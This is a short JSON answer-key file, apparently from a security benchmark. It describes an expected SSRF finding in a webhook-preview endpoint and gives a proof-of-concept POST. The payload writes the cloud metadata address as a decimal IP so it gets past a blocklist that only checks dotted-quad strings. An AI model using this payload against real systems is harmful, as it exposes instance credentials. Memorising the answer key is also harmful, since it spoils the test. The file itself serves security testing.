@@ -1,0 +1,13 @@
+{
+  "expected_vulnerability": "SSRF",
+  "severity": "High",
+  "oracle": "server_fetches_internal_resource",
+  "bypass_technique": "alternate_ip_representation",
+  "expected_payload_pattern": "http://2852039166/latest/meta-data/",
+  "poc": {
+    "method": "POST",
+    "path": "/api/webhook/preview",
+    "body_example": {"url": "http://2852039166/latest/meta-data/"},
+    "indicator": "blocklist_only_checks_dotted_quad_string"
+  }
+}
